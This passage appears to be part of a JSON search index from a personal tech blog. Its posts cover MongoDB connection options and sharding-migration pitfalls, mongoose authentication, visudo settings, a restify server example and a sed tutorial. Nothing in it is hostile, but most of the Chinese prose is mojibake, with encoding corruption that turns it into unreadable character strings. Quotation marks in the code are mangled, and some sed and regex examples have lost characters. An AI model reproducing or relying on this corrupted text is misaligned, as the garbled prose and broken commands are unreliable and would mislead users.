åº”ç”¨äºsafe=trueã€‚wtimeoutMS=msé©±åŠ¨æ·»åŠ  { wtimeout : ms } åˆ° getlasterror å‘½ä»¤. åº”ç”¨äº safe=true.fsync=true|falsetrue: é©±åŠ¨æ·»åŠ  { fsync : true } åˆ° getlasterror å‘½ä»¤.åº”ç”¨äº safe=true.false: é©±åŠ¨ä¸ä¼šæ·»åŠ åˆ°getLastErrorå‘½ä»¤ä¸­ã€‚.maxPoolSize=nminPoolSize=nä¸€äº›é©±åŠ¨ä¼šæŠŠæ²¡ç”¨çš„è¿æ¥å…³é—­ã€‚ ç„¶è€Œ,å¦‚æœè¿æ¥æ•°ä½äºminPoolSizeå€¼ä¹‹ä¸‹ï¼Œ å®ƒä»¬ä¸ä¼šå…³é—­ç©ºé—²çš„è¿æ¥ã€‚æ³¨æ„çš„æ˜¯è¿æ¥ä¼šæŒ‰ç…§éœ€è¦è¿›è¡Œåˆ›å»ºï¼Œå› æ­¤å½“è¿æ¥æ± è¢«è®¸å¤šè¿æ¥é¢„å¡«å……çš„æ—¶å€™ï¼ŒminPoolSizeä¸ä¼šç”Ÿæ•ˆã€‚waitQueueTimeoutMS=msåœ¨è¶…æ—¶ä¹‹å‰ï¼Œçº¿ç¨‹ç­‰å¾…è¿æ¥ç”Ÿæ•ˆçš„æ€»æ—¶é—´ã€‚å¦‚æœè¿æ¥æ± åˆ°è¾¾æœ€å¤§å¹¶ä¸”æ‰€æœ‰çš„è¿æ¥éƒ½åœ¨ä½¿ç”¨ï¼Œè¿™ä¸ªå‚æ•°å°±ç”Ÿæ•ˆäº†ã€‚waitQueueMultiple=né©±åŠ¨å¼ºè¡Œé™åˆ¶çº¿ç¨‹åŒæ—¶ç­‰å¾…è¿æ¥çš„ä¸ªæ•°ã€‚ è¿™ä¸ªé™åˆ¶äº†è¿æ¥æ± çš„å€æ•°ã€‚connectTimeoutMS=mså¯ä»¥æ‰“å¼€è¿æ¥çš„æ—¶é—´ã€‚socketTimeoutMS=mså‘é€å’Œæ¥å—socketsçš„æ—¶é—´å‚è€ƒèµ„æ–™ï¼š MongoDBçš„è¿æ¥å­—ç¬¦ä¸² http://www.studyofnet.com/news/337.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongoDB ä»å•èŠ‚ç‚¹è¿ç§»åˆ°åˆ†å¸ƒå¼é›†ç¾¤ é‡åˆ°çš„é—®é¢˜","slug":"history/tech/5953c4d0c2b92f5665eed9da","date":"2015-12-31T20:16:32.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9da/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9da/","excerpt":"","text":"1.linux ç¯å¢ƒä¸‹limit çš„è®¾ç½®é—®é¢˜ï¼šé”™è¯¯ï¼š $ ps -ef|grep mongod -bash: fork: retry: èµ„æºæš‚æ—¶ä¸å¯ç”¨ -bash: fork: retry: èµ„æºæš‚æ—¶ä¸å¯ç”¨ ^C-bash: fork: retry: èµ„æºæš‚æ—¶ä¸å¯ç”¨ -bash: fork: retry: èµ„æºæš‚æ—¶ä¸å¯ç”¨ -bash: fork: èµ„æºæš‚æ—¶ä¸å¯ç”¨ åŸå› ï¼š linux é»˜è®¤ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ•°ä¸º1024ï¼Œè¿›ç¨‹æ•°ä¹Ÿæ˜¯1024ï¼› æ‰€ä»¥å½“å®¢æˆ·ç«¯è¿æ¥è¶…è¿‡äº†ï¼Œå°±å‡ºé”™äº†ã€‚ è§£å†³æ–¹æ³•ï¼šé‡æ–°è®¾ç½®ulimit ï¼Œä»¥è§£å†³mongod è‡ªåŠ¨å…³é—­ã€‚ ä¿®æ”¹æ–‡ä»¶ï¼š /etc/security/limits.conf æ¯”å¦‚æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š mongo soft nproc 30000 mongo hard nproc 65536 mongo soft nofile 30000 mongo hard nofile 65536 2.mongodumpä¸èƒ½å…ˆé”è¡¨ã€‚db.fsyncLock() #é”ä½è¡¨ mongodump db.fsyncUnLock() #è§£é” ä»¥ä¸Šæ–¹æ³• mongodump æ— æ³•è¿è¡Œï¼Œä¹Ÿæ— æ³•å¤‡ä»½æ•°æ®ï¼ˆåœä½äº†ï¼‰ è¿™ä¸ªæ˜¯æˆ‘çªç„¶æƒ³å½“ç„¶çš„ï¼Œè¯•è¯•æ˜¯å¦åœ¨å¤‡ä»½æ—¶ä¹Ÿå¯ä»¥å…ˆé”ä½è¡¨ï¼Œä¸è®©å®¢æˆ·ç«¯å†™æ“ä½œã€‚å°±å‡ºè¿™é—®é¢˜äº†ã€‚ 3.æ•°æ®å¤‡ä»½è¯·è¯·ç¡®è®¤ç´¢å¼•æ˜¯å¦æœ‰ä¸åˆ†ç‰‡ç´¢å¼•ç›¸åŒï¼Œæœ‰ç›¸åŒçš„ï¼Œå…ˆåˆ é™¤ç´¢å¼•åï¼Œå†å¤‡ä»½ï¼šåœ¨å¯¼å…¥æ•°æ®æ—¶ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªè¡¨åŸå…ˆæœ‰ä¸¤ä¸ªå­—æ®µçš„å¤åˆç´¢å¼•ï¼Œåœ¨é€‰æ‹©ç‰‡é”®æ—¶ï¼Œä¹Ÿæ˜¯è¿™ä¸¤ä¸ªå­—æ®µåšçš„ç‰‡é”®ï¼Œæ•°æ®å¯¼å…¥æ—¶ï¼Œæç¤ºç´¢å¼•æ— æ³•æ›´æ–°ï¼Œå‡ºé”™ã€‚è§£å†³æ–¹æ³•ï¼šåˆ é™¤åŸç´¢å¼•ï¼Œæˆ–æ˜¯ä¿®æ”¹ç‰‡é”®å€¼ã€‚ 4.Hashç´¢å¼•æ—¶å¯¹keyè¿›è¡Œhashè®¡ç®—ç„¶ååˆ›å»ºç´¢å¼•ï¼Œç›®å‰åªæ”¯æŒç­‰å·è¿è¡Œï¼Œä¸æ”¯æŒåŒºé—´ä½¿ç”¨äº†HASH ç‰‡é”®åï¼ŒæŸ¥è¯¢/æ›´æ–°ï¼Œä¸èƒ½ä½¿ç”¨ in, $gte $lte ä¹‹ç±»çš„æ¡ä»¶ã€‚æ‰€ä»¥å¦‚æœä½ å®¢æˆ·ç«¯æœ‰å¤ªå¤šçš„ä»£ç æ˜¯ä½¿ç”¨äº† in, $gte $lte ä¹‹ç±»çš„æŸ¥è¯¢æ¡ä»¶ï¼Œé‚£è¦ æƒè¡¡ä¸€ä¸‹äº†ã€‚ä½ çš„ç‰‡é”®é€‰æ‹©æ˜¯å¦å¾—å½“ï¼Œæˆ–æ˜¯ä¿®æ”¹ä»£ç ã€‚ 5.å½“æ›´æ–°å•ä¸ªæ–‡æ¡£å¦‚æœä¸æŒ‡å®šç‰‡é”®ï¼Œä¼šå‡ºä»¥ä¸‹é”™è¯¯ï¼šdoes not contain shard key for pattern { user_id: 1.0, cookie: 1.0 }â€™MongoDBæ›´æ–°æ“ä½œæ— æ³•ç¡®å®šæ›´æ–°åˆ°å…·ä½“çš„æŸä¸ªåˆ†ç‰‡ä¸Šï¼Œæ‰€ä»¥å‡ºé”™ï¼Œ æŒ‡å®šç‰‡é”®åï¼Œæ›´æ–°æ“ä½œåªä¼šè·¯ç”±åˆ°æŸä¸€ä¸ªåˆ†ç‰‡ä¸Šã€‚ ä½†å¦‚æœä½ æ˜¯æ›´æ–°å¤šæ¡è®°å½•ï¼Œè·¯ç”±ä¼šæ›´æ–°åˆ°æ‰€æœ‰åˆ†ç‰‡ä¸Šã€‚ 6.æœ€å¤§è¿æ¥æ•°é—®é¢˜mongodb é»˜è®¤æœ€å¤§è¿æ¥æ•°ä¸º928ï¼Œå¦‚æœä½ æ²¡æœ‰æŒ‡å®šï¼Œåˆ°äº†è¿™ä¸ªæ•°æ—¶ï¼Œmongosï¼Œæˆ–æ˜¯mongodbè¿›ç¨‹ ä¼šè‡ªåŠ¨å…³é—­ï¼Œå¦‚æœæŸ¥çœ‹æ—¥å¿—ä¹Ÿæ— æ³•ç¡®è®¤æ˜¯ä»€ä¹ˆåŸå› mongod æœåŠ¡å™¨çªç„¶è‡ªåŠ¨å…³é—­äº†ï¼Œé‚£å¯ä»¥æŸ¥æŸ¥ å½“å‰è¿æ¥æ•°æ˜¯å¤šå°‘ï¼Œ mongos&gt; db.serverStatus().connections; { &quot;current&quot; : 1240, &quot;available&quot; : 22760, &quot;totalCreated&quot; : NumberLong(189438) }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"linux å¼€æœºä»¥æ™®é€šç”¨æˆ·èº«ä»½å¯åŠ¨","slug":"history/tech/5953c4d0c2b92f5665eed9d9","date":"2015-12-31T19:59:20.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d9/","excerpt":"","text":"linux å¼€æœºä»¥æ™®é€šç”¨æˆ·èº«ä»½å¯åŠ¨","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mongo  eval","slug":"history/tech/5953c4d0c2b92f5665eed9d8","date":"2015-12-31T19:19:57.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d8/","excerpt":"","text":"sudo mongo admin --eval â€œdb.shutdownServer()â€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"Authentication in mongoose using SCRAM-SHA-1","slug":"history/tech/5953c4d0c2b92f5665eed9d7","date":"2015-12-31T18:44:53.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d7/","excerpt":"","text":"ä¸å¥½ä½¿:mongoose.connect(â€˜mongodb://user:password@host:port/dbname?authSource=dbWithUserCredentialsâ€™)å¥½ä½¿ï¼šconfig.mgOptions = {user: 'root', pass: 'root', auth: 'SCRAM-SHA-1', server: {poolSize: 50}, connectTimeoutMS: 20000 };config.connString = â€˜mongodb://ip:port/databaseâ€™;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"ssh érootå…å¯†ç ç™»å½•","slug":"history/tech/5953c4d0c2b92f5665eed9d2","date":"2015-12-30T02:06:20.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d2/","excerpt":"","text":"http://bbs.chinaunix.net/forum.php?mod=viewthread&amp;tid=3554821","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"å¦‚ä½•åœ¨ubuntuä¸­è®¾ç½®visudoçš„é»˜è®¤ç¼–è¾‘å™¨","slug":"history/tech/5953c4d0c2b92f5665eed9d1","date":"2015-12-30T01:53:20.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d1/","excerpt":"","text":"åœ¨sudoersé‡ŒåŠ ä¸Š Set default EDITOR to vim, but allow visudo to use EDITOR/VISUAL.Defaults editor=/usr/bin/vim, env_editor","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"restify","slug":"history/tech/5953c4d0c2b92f5665eed9d0","date":"2015-12-29T20:37:40.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d0/","excerpt":"","text":"Restify æ˜¯ä¸€ä¸ª Node.JS æ¨¡å—ï¼Œå¯ä»¥è®©ä½ åˆ›å»ºæ­£ç¡®çš„ REST web servicesã€‚å®ƒå€Ÿé‰´äº†å¾ˆå¤š express çš„è®¾è®¡ï¼Œå› ä¸ºå®ƒæ˜¯ node.js web åº”ç”¨äº‹å®ä¸Šçš„æ ‡å‡† APIã€‚ç¤ºä¾‹ä»£ç ï¼šæœåŠ¡å™¨ç«¯ï¼švar restify = require(â€˜restifyâ€™);var server = restify.createServer({name: â€˜myappâ€™,version: â€˜1.0.0â€™});server.use(restify.acceptParser(server.acceptable));server.use(restify.queryParser());server.use(restify.bodyParser());server.get(â€™/echo/:nameâ€™, function (req, res, next) {res.send(req.params);return next();});server.listen(8080, function () {console.log(â€™%s listening at %sâ€™, server.name, server.url);});å®¢æˆ·ç«¯ï¼švar assert = require(â€˜assertâ€™);var restify = require(â€˜restifyâ€™);var client = restify.createJsonClient({url: â€˜http://localhost:8080â€™,version: â€˜~1.0â€™});client.get(â€™/echo/markâ€™, function (err, req, res, obj) {assert.ifError(err);console.log(â€˜Server returned: %jâ€™, obj);});","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"sed","slug":"history/tech/5953c4d0c2b92f5665eed9cf","date":"2015-12-29T19:57:53.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9cf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9cf/","excerpt":"","text":"1ã€sedç®€ä»‹sed æ˜¯ä¸€ç§åœ¨çº¿ç¼–è¾‘å™¨ï¼Œå®ƒä¸€æ¬¡å¤„ç†ä¸€è¡Œå†…å®¹ã€‚å¤„ç†æ—¶ï¼ŒæŠŠå½“å‰å¤„ç†çš„è¡Œå­˜å‚¨åœ¨ä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œç§°ä¸ºâ€œæ¨¡å¼ç©ºé—´â€ï¼ˆpattern spaceï¼‰ï¼Œæ¥ç€ç”¨sedå‘½ä»¤å¤„ç†ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¤„ç†å®Œæˆåï¼ŒæŠŠç¼“å†²åŒºçš„å†…å®¹é€å¾€å±å¹•ã€‚æ¥ç€å¤„ç†ä¸‹ä¸€è¡Œï¼Œè¿™æ ·ä¸æ–­é‡å¤ï¼Œç›´åˆ°æ–‡ä»¶æœ«å°¾ã€‚æ–‡ä»¶å†…å®¹å¹¶æ²¡æœ‰ æ”¹å˜ï¼Œé™¤éä½ ä½¿ç”¨é‡å®šå‘å­˜å‚¨è¾“å‡ºã€‚Sedä¸»è¦ç”¨æ¥è‡ªåŠ¨ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ï¼›ç®€åŒ–å¯¹æ–‡ä»¶çš„åå¤æ“ä½œï¼›ç¼–å†™è½¬æ¢ç¨‹åºç­‰ã€‚2ã€å®šå€å¯ä»¥é€šè¿‡å®šå€æ¥å®šä½ä½ æ‰€å¸Œæœ›ç¼–è¾‘çš„è¡Œï¼Œè¯¥åœ°å€ç”¨æ•°å­—æ„æˆï¼Œç”¨é€—å·åˆ†éš”çš„ä¸¤ä¸ªè¡Œæ•°è¡¨ç¤ºä»¥è¿™ä¸¤è¡Œä¸ºèµ·æ­¢çš„è¡Œçš„èŒƒå›´ï¼ˆåŒ…æ‹¬è¡Œæ•°è¡¨ç¤ºçš„é‚£ä¸¤è¡Œï¼‰ã€‚å¦‚7ï¼Œ9è¡¨ç¤º7,8,9è¡Œï¼Œ$ç¬¦å·è¡¨ç¤ºæœ€åä¸€è¡Œã€‚èŒƒå›´å¯ä»¥é€šè¿‡æ•°æ®ï¼Œæ­£åˆ™è¡¨è¾¾å¼æˆ–è€…äºŒè€…ç»“åˆçš„æ–¹å¼ç¡®å®š ã€‚3ã€Sedå‘½ä»¤è¯¦è§£è°ƒç”¨sedå‘½ä»¤æœ‰ä¸¤ç§å½¢å¼ï¼šsed â€˜commandâ€™ file(s)sed -f scriptfile file(s)a\\ //åœ¨å½“å‰è¡Œåé¢åŠ å…¥ä¸€è¡Œæ–‡æœ¬ã€‚b lable //åˆ†æ”¯åˆ°è„šæœ¬ä¸­å¸¦æœ‰æ ‡è®°çš„åœ°æ–¹ï¼Œå¦‚æœåˆ†æ”¯ä¸å­˜åœ¨åˆ™åˆ†æ”¯åˆ°è„šæœ¬çš„æœ«å°¾ã€‚c\\ //ç”¨æ–°çš„æ–‡æœ¬æ”¹å˜æœ¬è¡Œçš„æ–‡æœ¬ã€‚d //ä»æ¨¡æ¿å—ï¼ˆPattern spaceï¼‰ä½ç½®åˆ é™¤è¡Œã€‚D //åˆ é™¤æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œã€‚i\\ //åœ¨å½“å‰è¡Œä¸Šé¢æ’å…¥æ–‡æœ¬ã€‚h /æ‹·è´æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒºã€‚H //è¿½åŠ æ¨¡æ¿å—çš„å†…å®¹åˆ°å†…å­˜ä¸­çš„ç¼“å†²åŒºg //å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶æ›¿ä»£å½“å‰æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬ã€‚G //è·å¾—å†…å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶è¿½åŠ åˆ°å½“å‰æ¨¡æ¿å—æ–‡æœ¬çš„åé¢ã€‚l //åˆ—è¡¨ä¸èƒ½æ‰“å°å­—ç¬¦çš„æ¸…å•ã€‚n //è¯»å–ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œï¼Œç”¨ä¸‹ä¸€ä¸ªå‘½ä»¤å¤„ç†æ–°çš„è¡Œè€Œä¸æ˜¯ç”¨ç¬¬ä¸€ä¸ªå‘½ä»¤ã€‚N //è¿½åŠ ä¸‹ä¸€ä¸ªè¾“å…¥è¡Œåˆ°æ¨¡æ¿å—åé¢å¹¶åœ¨äºŒè€…é—´åµŒå…¥ä¸€ä¸ªæ–°è¡Œï¼Œæ”¹å˜å½“å‰è¡Œå·ç ã€‚p //æ‰“å°æ¨¡æ¿å—çš„è¡Œã€‚Pï¼ˆå¤§å†™ï¼‰ //æ‰“å°æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œã€‚q //é€€å‡ºSedã€‚r file //ä»fileä¸­è¯»è¡Œã€‚t label //ifåˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œæ¡ä»¶ä¸€æ—¦æ»¡è¶³æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾ã€‚T label //é”™è¯¯åˆ†æ”¯ï¼Œä»æœ€åä¸€è¡Œå¼€å§‹ï¼Œä¸€æ—¦å‘ç”Ÿé”™è¯¯æˆ–è€…Tï¼Œtå‘½ä»¤ï¼Œå°†å¯¼è‡´åˆ†æ”¯åˆ°å¸¦æœ‰æ ‡å·çš„å‘½ä»¤å¤„ï¼Œæˆ–è€…åˆ°è„šæœ¬çš„æœ«å°¾ã€‚w file //å†™å¹¶è¿½åŠ æ¨¡æ¿å—åˆ°fileæœ«å°¾ã€‚W file //å†™å¹¶è¿½åŠ æ¨¡æ¿å—çš„ç¬¬ä¸€è¡Œåˆ°fileæœ«å°¾ã€‚! //è¡¨ç¤ºåé¢çš„å‘½ä»¤å¯¹æ‰€æœ‰æ²¡æœ‰è¢«é€‰å®šçš„è¡Œå‘ç”Ÿä½œç”¨ã€‚s/re/string //ç”¨stringæ›¿æ¢æ­£åˆ™è¡¨è¾¾å¼reã€‚= //æ‰“å°å½“å‰è¡Œå·ç ã€‚ //æŠŠæ³¨é‡Šæ‰©å±•åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä»¥å‰ã€‚ä»¥ä¸‹çš„æ˜¯æ›¿æ¢æ ‡è®°gè¡¨ç¤ºè¡Œå†…å…¨é¢æ›¿æ¢ã€‚pè¡¨ç¤ºæ‰“å°è¡Œã€‚wè¡¨ç¤ºæŠŠè¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚xè¡¨ç¤ºäº’æ¢æ¨¡æ¿å—ä¸­çš„æ–‡æœ¬å’Œç¼“å†²åŒºä¸­çš„æ–‡æœ¬ã€‚yè¡¨ç¤ºæŠŠä¸€ä¸ªå­—ç¬¦ç¿»è¯‘ä¸ºå¦å¤–çš„å­—ç¬¦ï¼ˆä½†æ˜¯ä¸ç”¨äºæ­£åˆ™è¡¨è¾¾å¼ï¼‰Options:-e command, --expression=command //å…è®¸å¤šå°ç¼–è¾‘ã€‚-h, --help //æ‰“å°å¸®åŠ©ï¼Œå¹¶æ˜¾ç¤ºbugåˆ—è¡¨çš„åœ°å€ã€‚-n, --quiet, --silent //å–æ¶ˆé»˜è®¤è¾“å‡ºã€‚-f, --filer=script-file //å¼•å¯¼sedè„šæœ¬æ–‡ä»¶åã€‚-V, --version //æ‰“å°ç‰ˆæœ¬å’Œç‰ˆæƒä¿¡æ¯ã€‚4ã€å…ƒå­—ç¬¦é›† åŒ¹é…ç¬¦^ é”šå®šè¡Œçš„å¼€å§‹ å¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚$ é”šå®šè¡Œçš„ç»“æŸ å¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚. åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„å­—ç¬¦ å¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œç„¶åæ˜¯dã€‚åŒ¹é…é›¶æˆ–å¤šä¸ªå­—ç¬¦ å¦‚ï¼š/*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿsedçš„è¡Œã€‚[] åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/ed/åŒ¹é…sedå’ŒSedã€‚åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚(â€¦) ä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/(love)able/\\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚&amp; ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/&amp;/ï¼Œloveè¿™æˆloveã€‚&lt; é”šå®šå•è¯çš„å¼€å§‹ï¼Œå¦‚:/&lt;love åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚&gt; é”šå®šå•è¯çš„ç»“æŸï¼Œå¦‚/love&gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚x{m} é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0{5}/åŒ¹é…åŒ…å«5ä¸ªoçš„è¡Œã€‚x{m,} é‡å¤å­—ç¬¦x,è‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/o{5,}/åŒ¹é…è‡³å°‘æœ‰5ä¸ªoçš„è¡Œã€‚x{m,n} é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/o{5,10}/åŒ¹é…5â€“10ä¸ªoçš„è¡Œã€‚å…³äºè¿‡æ»¤å­—ç¬¦ä¸²é—®é¢˜æ¯”å¦‚åœ¨ä¸€ä¸ªæ–‡æœ¬ä¸­æœç´¢abcdè¿™å››ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨grep ç»“æœå‡ºæ¥abcdef ã€zabcd ã€abcd ã€ hiabcdâ€¦ ç­‰ç­‰ï¼Œå…¶å®åªæƒ³æœç´¢abcdA: ä½¿ç”¨ç²¾ç¡®åŒ¹é… $grep â€œâ€ filenamesedä¸­æŸ¥æ‰¾æ¨¡å¼åŒ¹é…ï¼š. å•å­—ç¬¦é€šé…ç¬¦åŒ¹é…0,1,2,3â€¦8,9åŒ¹é…a,b,câ€¦zåŒ¹é…ä¸å«0,1,2â€¦9çš„æ‰€æœ‰å…¶ä»–å­—ç¬¦â€œ.*â€ åŒ¹é…&quot;&quot;å†…ä»»ä½•å­—ç¬¦ä¸²^ è¡Œå¼€å§‹æ ‡å¿—$ è¡Œç»“æŸæ ‡å¿—5ã€æˆ‘ä»¬æ¥çœ‹å‡ ä¸ªä¾‹å­ï¼šåˆ é™¤ï¼šdå‘½ä»¤#sed â€˜2dâ€™ example-----åˆ é™¤exampleæ–‡ä»¶çš„ç¬¬äºŒè¡Œã€‚#sed â€˜2,d' example-----åˆ é™¤exampleæ–‡ä»¶çš„ç¬¬äºŒè¡Œåˆ°æœ«å°¾æ‰€æœ‰è¡Œã€‚ #sed 'dâ€™ example-----åˆ é™¤exampleæ–‡ä»¶çš„æœ€åä¸€è¡Œã€‚#sed '/test/'d example-----åˆ é™¤exampleæ–‡ä»¶æ‰€æœ‰åŒ…å«testçš„è¡Œã€‚#sed d filename-----sedåˆ é™¤æ–‡ä»¶filenameä¸­çš„æ‰€æœ‰è¡Œ#sed 2,5d filename-----sedåˆ é™¤æ–‡ä»¶filenameä¸­çš„2è‡³5è¡Œ#sed /abc/d filename-----sedåˆ é™¤æ–‡ä»¶filenameä¸­åŒ…å«å­—ç¬¦ä¸²abcçš„æ‰€æœ‰è¡Œæ›¿æ¢ï¼šså‘½ä»¤#sed â€˜s/test/mytest/gâ€™ 